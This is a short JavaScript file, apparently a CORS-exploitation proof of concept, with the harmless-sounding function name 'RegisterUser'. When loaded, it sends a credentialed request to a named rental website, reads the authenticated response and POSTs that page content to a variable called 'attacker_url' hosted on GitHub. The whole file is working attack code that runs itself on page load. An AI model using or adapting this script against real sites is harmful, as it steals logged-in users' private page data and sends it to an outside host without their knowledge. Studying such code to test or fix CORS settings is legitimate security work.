function RegisterUser(){
var cors = new XMLHttpRequest();
			var Victim_url = 'https://www.irinarentals.com/';
			cors.open('GET', Victim_url, true);
			cors.withCredentials = true;
			cors.onload = reqListener;
			cors.send();
			console.log(this.responseText)

			function reqListener() {
				var data = new XMLHttpRequest();
				var attacker_url = 'https://raw.githubusercontent.com/AssassinUKG/testing/main/cookie.js';
				data.open('POST', attacker_url);
				data.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
				data.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
			};
}
RegisterUser();
